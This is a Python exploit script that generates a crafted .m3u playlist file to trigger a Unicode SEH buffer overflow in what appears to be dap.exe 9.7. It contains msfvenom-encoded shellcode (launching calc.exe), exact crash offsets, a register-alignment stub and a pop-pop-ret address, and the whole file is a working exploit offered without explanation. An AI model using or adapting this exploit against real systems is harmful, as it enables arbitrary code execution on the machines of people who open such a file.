import sys

filename = "sploit_dap_9.7.m3u"

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -e x86/unicode_mixed -f python -b "\x00\x0a\x0d" -v shellcode bufferregister=eax
# Size 512
shellcode =  ""
shellcode += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
shellcode += "\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
shellcode += "\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
shellcode += "\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
shellcode += "\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
shellcode += "\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
shellcode += "\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
shellcode += "\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
shellcode += "\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
shellcode += "\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
shellcode += "\x75\x34\x4a\x42\x79\x6c\x57\x78\x43\x52\x4b\x50"
shellcode += "\x4d\x30\x6d\x30\x73\x30\x55\x39\x48\x65\x70\x31"
shellcode += "\x55\x70\x73\x34\x34\x4b\x42\x30\x4c\x70\x44\x4b"
shellcode += "\x32\x32\x6a\x6c\x34\x4b\x42\x32\x6d\x44\x74\x4b"
shellcode += "\x73\x42\x4e\x48\x6a\x6f\x55\x67\x6e\x6a\x4b\x76"
shellcode += "\x4d\x61\x39\x6f\x54\x6c\x4d\x6c\x63\x31\x43\x4c"
shellcode += "\x79\x72\x4c\x6c\x4d\x50\x55\x71\x46\x6f\x6a\x6d"
shellcode += "\x59\x71\x69\x37\x47\x72\x38\x72\x51\x42\x71\x47"
shellcode += "\x72\x6b\x4e\x72\x6a\x70\x32\x6b\x70\x4a\x6d\x6c"
shellcode += "\x54\x4b\x30\x4c\x6e\x31\x54\x38\x38\x63\x6d\x78"
shellcode += "\x5a\x61\x7a\x31\x72\x31\x62\x6b\x61\x49\x6b\x70"
shellcode += "\x6d\x31\x48\x53\x32\x6b\x6f\x59\x6a\x78\x7a\x43"
shellcode += "\x4f\x4a\x61\x39\x64\x4b\x6c\x74\x44\x4b\x4b\x51"
shellcode += "\x7a\x36\x4d\x61\x6b\x4f\x64\x6c\x57\x51\x78\x4f"
shellcode += "\x5a\x6d\x69\x71\x49\x37\x4f\x48\x4b\x30\x72\x55"
shellcode += "\x5a\x56\x4d\x33\x73\x4d\x68\x78\x6d\x6b\x73\x4d"
shellcode += "\x4d\x54\x52\x55\x4b\x34\x42\x38\x74\x4b\x32\x38"
shellcode += "\x4b\x74\x4d\x31\x59\x43\x61\x56\x34\x4b\x6c\x4c"
shellcode += "\x30\x4b\x54\x4b\x6f\x68\x4d\x4c\x59\x71\x79\x43"
shellcode += "\x34\x4b\x6b\x54\x72\x6b\x6d\x31\x66\x70\x71\x79"
shellcode += "\x51\x34\x6c\x64\x6e\x44\x61\x4b\x61\x4b\x33\x31"
shellcode += "\x6f\x69\x61\x4a\x4e\x71\x69\x6f\x37\x70\x61\x4f"
shellcode += "\x71\x4f\x70\x5a\x32\x6b\x6d\x42\x58\x6b\x62\x6d"
shellcode += "\x51\x4d\x51\x5a\x5a\x61\x64\x4d\x61\x75\x45\x62"
shellcode += "\x59\x70\x4d\x30\x49\x70\x6e\x70\x61\x58\x4d\x61"
shellcode += "\x52\x6b\x62\x4f\x44\x47\x59\x6f\x68\x55\x37\x4b"
shellcode += "\x4c\x30\x45\x65\x34\x62\x61\x46\x51\x58\x46\x46"
shellcode += "\x65\x45\x45\x6d\x65\x4d\x49\x6f\x79\x45\x6f\x4c"
shellcode += "\x5a\x66\x71\x6c\x4a\x6a\x45\x30\x6b\x4b\x4b\x30"
shellcode += "\x30\x75\x4d\x35\x35\x6b\x30\x47\x4a\x73\x73\x42"
shellcode += "\x70\x6f\x52\x4a\x79\x70\x6f\x63\x69\x6f\x39\x45"
shellcode += "\x70\x63\x31\x51\x32\x4c\x71\x53\x6c\x6e\x53\x35"
shellcode += "\x70\x78\x61\x55\x69\x70\x41\x41"

# Maximum length
maxlen = 20000

# Offsets
crash_nseh = 14277
crash_seh = crash_nseh + 4

# Align registers via POPAD to RET into EAX
align_reg = (   "\x55"              # Padding
                "\x61"              # POPAD
                "\x55"              # Padding
                "\x61"              # POPAD
                "\x55"              # Padding
                "\x61"              # POPAD
                "\x55"              # Padding
                "\x56"              # PUSH ESI
                "\x55"              # Padding
                "\x58"              # POP EAX
                "\xc0"              # "\x00\xc0" == ADD AL,AL
                "\x55"              # Padding
                "\x50"              # PUSH EAX
                "\x55"              # Padding
                "\xc3"              # RET
)

# Pad buffer
pad_eax = "\x55" * 13

# Craft strings
prefix = "http://"
prefix += "A" * crash_nseh
nseh = "\x41\x65"                                   # NOP unicode
seh = "\xde\x49"                                    # 0x005c003b # PPR # dap.exe
suffix = align_reg
suffix += pad_eax
suffix += shellcode
suffix += "D" * (maxlen - len(prefix + nseh + seh + suffix))

# Build payload
payload = prefix + nseh + seh + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()
